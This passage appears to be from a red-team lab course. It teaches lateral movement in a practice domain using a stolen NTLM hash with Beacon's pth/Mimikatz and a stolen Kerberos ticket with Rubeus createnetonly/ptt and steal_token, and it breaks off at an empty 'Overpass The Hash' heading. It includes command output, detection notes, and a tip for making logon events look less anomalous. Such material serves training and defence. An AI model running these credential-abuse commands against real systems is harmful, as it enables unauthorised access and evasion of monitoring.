We know from our domain recon that jking is a local administrator on multiple computers via his membership of the Support Engineers domain group.  We also have credential material for this user in the form of an NTLM hash, AES256 hash and a Kerberos TGT.

This chapter will demonstrate different techniques in which we can leverage these credentials and use them to access one of the target computers.  There are also several techniques where we don't need credential material directly, but that take advantage of processes that the user is running on a machine we have elevated access on.
A common way of testing access to a machine is to list the C drive, as this requires local admin privileges to access.

# Pass The Hash 

Pass the hash is a technique that allows you to authenticate to a Windows service using the NTLM hash of a user's password.  It works by starting a new logon session with a fake identity and then replacing the session information with the domain, username and NTLM hash provided.

Beacon has a dedicated pth command which executes Mimikatz in the background.
  This command requires elevated privileges.


First, attempt to list the C$ share of the WEB machine - this will fail because bfarmer is not a local admin there.

    beacon> getuid
    [*] You are DEV\bfarmer (admin)
    
    beacon> ls \\web.dev.cyberbotic.io\c$
    [-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED

Then run the pth command with jking's username and NTLM hash.

    beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
    beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
    user	: jking
    domain	: DEV 
    program	: C:\Windows\system32\cmd.exe /c echo 71fb38e2d65 > \\.\pipe\675b08
    impers.	: no
    NTLM	: 59fc0f884922b4ce376051134c71e22c
    |  PID  1932
    |  TID  6600
    |  LSA Process is now R/W
    |  LUID 0 ; 7479840 (00000000:00722220)
    \_ msv1_0   - data copy @ 000001F6344B3D20 : OK !
    \_ kerberos - data copy @ 000001F6345BD7C8
    \_ aes256_hmac       -> null             
    \_ aes128_hmac       -> null             
    \_ rc4_hmac_nt       OK
    \_ rc4_hmac_old      OK
    \_ rc4_md4           OK
    \_ rc4_hmac_nt_exp   OK
    \_ rc4_hmac_old_exp  OK
    \_ *Password replace @ 000001F6344C6128 (32) -> null

We can see that the command Mimiktaz runs passes the new credentials over a named pipe, which Beacon then impersonates automatically.  We can then attempt to list the C$ share again, which will succeed.

    beacon> ls \\web.dev.cyberbotic.io\c$
    [*] Listing: \\web.dev.cyberbotic.io\c$\
    
    Size     Type    Last Modified         Name


To "drop" impersonation afterwards, use the rev2self command.

    beacon> rev2self
    [*] Tasked beacon to revert token
    
    beacon> ls \\web.dev.cyberbotic.io\c$
    [-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED

- Two opportunities to detect PTH are the R/W handle to LSASS; and looking for the echo foo > \\.\pipe\bar pattern in command-line logs.
- The former is already part of the "Suspicious Handle to LSASS" saved search.  This time we see an access mask of 0x1038.  This is a combination of PROCESS_QUERY_LIMITED_INFORMATION (0x1000), PROCESS_VM_WRITE (0x0020), PROCESS_VM_READ (0x0010) and PROCESS_VM_OPERATION (0x0008).

- The latter can be found via the "Suspicious Named Pipe Impersonation" search, which queries process events where the arguments contain "echo", ">" and "\\.\pipe\".


# Pass The Ticket 

Pass the ticket is a technique that allows you to add Kerberos tickets to an existing logon session (LUID) that you have access to, or a new one you create.  Accessing a remote resource will then allow that authentication to happen via Kerberos.

For this, we can leverage the TGT we extracted from jking's logon session on Workstation 2.

The first step is to create a blank, "sacrificial" logon session that we can pass the TGT into.  We do this because a logon session can only hold a single TGT at a time.  If we passed jking's TGT into the LUID for bfarmer, it would erase bfarmer's TGT and cause all sorts of authentication issues for the user.

- Creating a new logon session and passing tickets into sessions other than your own requires elevated privileges.

Rubeus' createnetonly command will start a new hidden process of our choosing, using the CreateProcessWithLogonW API.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

This also creates a new LUID.  It will have no tickets inside, so won't be visible with triage just yet.  The next step is to pass the TGT into this new LUID using the Rubeus ptt command.  Where the /luid is the new LUID we just created and /ticket is the base64 encoded ticket we previously extracted.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

Rubeus triage will now show jking's TGT inside this LUID.

    | 0x798c2c | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 9/1/2022 5:29:20 PM |

The final step is to impersonate the process that we created with createnetonly using Cobalt Strike's steal_token command.  At a minimum, this requires the PID of the target process, which in this example, is 4748.  We'll then be able to access the remote machine.

    beacon> steal_token 4748
    
    beacon> ls \\web.dev.cyberbotic.io\c$
    [*] Listing: \\web.dev.cyberbotic.io\c$\

As before, use rev2self to drop the impersonation.  To destroy the logon session we created, simply kill the process with the kill command.

    beacon> rev2self
    beacon> kill 4748

Rubeus triage will no longer show the logon session.

- By default, Rubeus will use a random username, domain and password with CreateProcessWithLogonW, which will appear in the associated 4624 logon event.  The "Suspicious Logon Events" saved search will show 4624's where the TargetOutboundDomainName is not an expected value.

We can provide these options on the command line to make the fields appear less anomalous.  The password does not have to be the users' actual password.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123

# Overpass The Hash









